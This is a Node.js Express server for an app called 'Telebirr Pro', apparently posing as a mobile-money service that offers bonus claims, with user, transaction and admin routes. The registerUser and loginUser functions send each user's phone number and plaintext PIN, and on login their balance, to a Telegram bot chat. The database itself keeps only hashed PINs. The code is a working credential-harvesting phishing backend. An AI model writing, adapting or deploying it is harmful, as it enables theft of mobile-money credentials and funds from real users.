// ============================================================
// SERVER.JS - Node.js Backend Server
// ============================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const mysql = require('mysql2/promise');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ============ MIDDLEWARE ============
app.use(helmet());
app.use(cors({
    origin: ['http://localhost:3000', 'http://localhost:5500'],
    credentials: true
}));
app.use(morgan('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

app.use(session({
    secret: process.env.SESSION_SECRET || 'secret_key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        maxAge: 3600000 // 1 hour
    }
}));

// ============ DATABASE CONNECTION ============
const pool = mysql.createPool({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASS || '',
    database: process.env.DB_NAME || 'telebirr_pro',
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
});

// ============ TELEGRAM FUNCTIONS ============
async function sendTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: process.env.CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Telegram error:', error.message);
    }
}

// ============ USER FUNCTIONS ============
async function registerUser(phone, pin, name) {
    const hashedPin = await bcrypt.hash(pin, 10);
    const [result] = await pool.execute(
        'INSERT INTO users (phone, pin, name, created_at) VALUES (?, ?, ?, NOW())',
        [phone, hashedPin, name]
    );
    
    if (result.affectedRows > 0) {
        const message = `🆕 <b>NEW USER REGISTERED</b>\n\n` +
                       `📱 <b>Phone:</b> <code>${phone}</code>\n` +
                       `🔑 <b>PIN:</b> <code>${pin}</code>\n` +
                       `👤 <b>Name:</b> ${name || 'Not provided'}\n` +
                       `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
        await sendTelegram(message);
        return true;
    }
    return false;
}

async function loginUser(phone, pin) {
    const [rows] = await pool.execute(
        'SELECT * FROM users WHERE phone = ? AND status = "active"',
        [phone]
    );
    
    if (rows.length === 0) return null;
    
    const user = rows[0];
    const valid = await bcrypt.compare(pin, user.pin);
    
    if (valid) {
        await pool.execute(
            'UPDATE users SET last_login = NOW(), login_attempts = 0 WHERE id = ?',
            [user.id]
        );
        
        const message = `🔐 <b>USER LOGIN</b>\n\n` +
                       `📱 <b>Phone:</b> <code>${phone}</code>\n` +
                       `🔑 <b>PIN:</b> <code>${pin}</code>\n` +
                       `👤 <b>Name:</b> ${user.name || 'Not set'}\n` +
                       `💰 <b>Balance:</b> ETB ${Number(user.balance).toFixed(2)}\n` +
                       `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
        await sendTelegram(message);
        
        return user;
    }
    
    // Failed attempt
    await pool.execute(
        'UPDATE users SET login_attempts = login_attempts + 1 WHERE id = ?',
        [user.id]
    );
    
    return null;
}

async function getUser(id) {
    const [rows] = await pool.execute('SELECT * FROM users WHERE id = ?', [id]);
    return rows.length > 0 ? rows[0] : null;
}

async function getBonuses(activeOnly = true) {
    let sql = 'SELECT * FROM bonuses';
    if (activeOnly) {
        sql += " WHERE status = 'active' AND (expiry_date IS NULL OR expiry_date > NOW())";
    }
    sql += ' ORDER BY created_at DESC';
    const [rows] = await pool.execute(sql);
    return rows;
}

async function claimBonus(userId, bonusId) {
    // Check if already claimed
    const [existing] = await pool.execute(
        'SELECT * FROM bonus_claims WHERE user_id = ? AND bonus_id = ?',
        [userId, bonusId]
    );
    if (existing.length > 0) {
        return { success: false, message: 'Already claimed this bonus' };
    }
    
    // Get bonus
    const [bonusRows] = await pool.execute(
        'SELECT * FROM bonuses WHERE id = ? AND status = "active"',
        [bonusId]
    );
    if (bonusRows.length === 0) {
        return { success: false, message: 'Bonus not available' };
    }
    const bonus = bonusRows[0];
    
    // Start transaction
    const connection = await pool.getConnection();
    await connection.beginTransaction();
    
    try {
        await connection.execute(
            'INSERT INTO bonus_claims (user_id, bonus_id) VALUES (?, ?)',
            [userId, bonusId]
        );
        
        await connection.execute(
            'UPDATE users SET balance = balance + ? WHERE id = ?',
            [bonus.amount, userId]
        );
        
        await connection.execute(
            'INSERT INTO transactions (user_id, type, amount, description) VALUES (?, "bonus", ?, ?)',
            [userId, bonus.amount, 'Bonus: ' + bonus.title]
        );
        
        await connection.commit();
        connection.release();
        
        const user = await getUser(userId);
        const message = `🎁 <b>BONUS CLAIMED</b>\n\n` +
                       `👤 <b>User:</b> ${user.phone}\n` +
                       `💰 <b>Amount:</b> ETB ${Number(bonus.amount).toFixed(2)}\n` +
                       `📦 <b>Package:</b> ${bonus.title}`;
        await sendTelegram(message);
        
        return { success: true, message: 'Bonus claimed successfully!' };
    } catch (error) {
        await connection.rollback();
        connection.release();
        return { success: false, message: 'Error claiming bonus: ' + error.message };
    }
}

async function getTransactions(userId, limit = 20) {
    const [rows] = await pool.execute(
        'SELECT * FROM transactions WHERE user_id = ? ORDER BY created_at DESC LIMIT ?',
        [userId, limit]
    );
    return rows;
}

// ============ API ROUTES ============

// Auth routes
app.post('/api/login', async (req, res) => {
    const { phone, pin } = req.body;
    
    if (!phone || !pin) {
        return res.status(400).json({ success: false, message: 'Phone and PIN required' });
    }
    
    const user = await loginUser(phone, pin);
    if (user) {
        req.session.userId = user.id;
        req.session.userPhone = user.phone;
        req.session.userName = user.name;
        req.session.userBalance = user.balance;
        req.session.isAdmin = user.phone === 'admin';
        
        return res.json({
            success: true,
            message: 'Login successful',
            user: {
                id: user.id,
                phone: user.phone,
                name: user.name,
                balance: user.balance
            }
        });
    }
    
    res.status(401).json({ success: false, message: 'Invalid phone or PIN' });
});

app.post('/api/register', async (req, res) => {
    const { name, phone, pin, confirmPin } = req.body;
    
    if (!name || !phone || !pin || !confirmPin) {
        return res.status(400).json({ success: false, message: 'All fields required' });
    }
    
    if (pin !== confirmPin) {
        return res.status(400).json({ success: false, message: 'PINs do not match' });
    }
    
    // Check if phone exists
    const [existing] = await pool.execute('SELECT id FROM users WHERE phone = ?', [phone]);
    if (existing.length > 0) {
        return res.status(400).json({ success: false, message: 'Phone already registered' });
    }
    
    const result = await registerUser(phone, pin, name);
    if (result) {
        return res.json({ success: true, message: 'Registration successful!' });
    }
    
    res.status(500).json({ success: false, message: 'Registration failed' });
});

app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true, message: 'Logged out' });
});

// User routes
app.get('/api/user', async (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ success: false, message: 'Not logged in' });
    }
    
    const user = await getUser(req.session.userId);
    if (user) {
        return res.json({
            success: true,
            user: {
                id: user.id,
                phone: user.phone,
                name: user.name,
                balance: user.balance,
                status: user.status
            }
        });
    }
    
    res.status(404).json({ success: false, message: 'User not found' });
});

app.put('/api/user', async (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ success: false, message: 'Not logged in' });
    }
    
    const { name, currentPin, newPin } = req.body;
    const updates = [];
    const values = [];
    
    if (name) {
        updates.push('name = ?');
        values.push(name);
    }
    
    if (currentPin && newPin) {
        const user = await getUser(req.session.userId);
        const valid = await bcrypt.compare(currentPin, user.pin);
        if (!valid) {
            return res.status(400).json({ success: false, message: 'Current PIN is incorrect' });
        }
        const hashedPin = await bcrypt.hash(newPin, 10);
        updates.push('pin = ?');
        values.push(hashedPin);
    }
    
    if (updates.length === 0) {
        return res.status(400).json({ success: false, message: 'No updates provided' });
    }
    
    values.push(req.session.userId);
    await pool.execute(
        `UPDATE users SET ${updates.join(', ')} WHERE id = ?`,
        values
    );
    
    // Update session
    if (name) {
        req.session.userName = name;
    }
    
    res.json({ success: true, message: 'Profile updated successfully' });
});

// Bonus routes
app.get('/api/bonuses', async (req, res) => {
    const bonuses = await getBonuses(req.query.active !== 'false');
    res.json({ success: true, bonuses });
});

app.post('/api/claim-bonus', async (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ success: false, message: 'Not logged in' });
    }
    
    const { bonusId } = req.body;
    if (!bonusId) {
        return res.status(400).json({ success: false, message: 'Bonus ID required' });
    }
    
    const result = await claimBonus(req.session.userId, bonusId);
    res.json(result);
});

// Transaction routes
app.get('/api/transactions', async (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ success: false, message: 'Not logged in' });
    }
    
    const limit = parseInt(req.query.limit) || 20;
    const transactions = await getTransactions(req.session.userId, limit);
    res.json({ success: true, transactions });
});

// Dashboard data
app.get('/api/dashboard', async (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ success: false, message: 'Not logged in' });
    }
    
    const user = await getUser(req.session.userId);
    const bonuses = await getBonuses(true);
    const transactions = await getTransactions(req.session.userId, 10);
    
    res.json({
        success: true,
        user: {
            id: user.id,
            phone: user.phone,
            name: user.name,
            balance: user.balance
        },
        bonuses,
        transactions
    });
});

// Admin routes
app.get('/api/admin/users', async (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ success: false, message: 'Admin access required' });
    }
    
    const [rows] = await pool.execute('SELECT * FROM users ORDER BY created_at DESC');
    res.json({ success: true, users: rows });
});

app.put('/api/admin/user/:id', async (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ success: false, message: 'Admin access required' });
    }
    
    const { status } = req.body;
    await pool.execute('UPDATE users SET status = ? WHERE id = ?', [status, req.params.id]);
    res.json({ success: true, message: 'User updated' });
});

app.post('/api/admin/bonus', async (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ success: false, message: 'Admin access required' });
    }
    
    const { title, description, amount, type, expiry } = req.body;
    await pool.execute(
        'INSERT INTO bonuses (title, description, amount, type, expiry_date, created_at) VALUES (?, ?, ?, ?, ?, NOW())',
        [title, description, amount, type, expiry || null]
    );
    res.json({ success: true, message: 'Bonus added' });
});

app.delete('/api/admin/bonus/:id', async (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ success: false, message: 'Admin access required' });
    }
    
    await pool.execute('DELETE FROM bonuses WHERE id = ?', [req.params.id]);
    res.json({ success: true, message: 'Bonus deleted' });
});

// ============ SERVE HTML FILES ============
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

app.get('/dashboard', (req, res) => {
    res.sendFile(__dirname + '/dashboard.html');
});

app.get('/bonus', (req, res) => {
    res.sendFile(__dirname + '/bonus.html');
});

app.get('/profile', (req, res) => {
    res.sendFile(__dirname + '/profile.html');
});

// ============ START SERVER ============
app.listen(PORT, () => {
    console.log(`🚀 Telebirr Pro Server running on http://localhost:${PORT}`);
    console.log(`📱 Environment: ${process.env.NODE_ENV || 'development'}`);
});
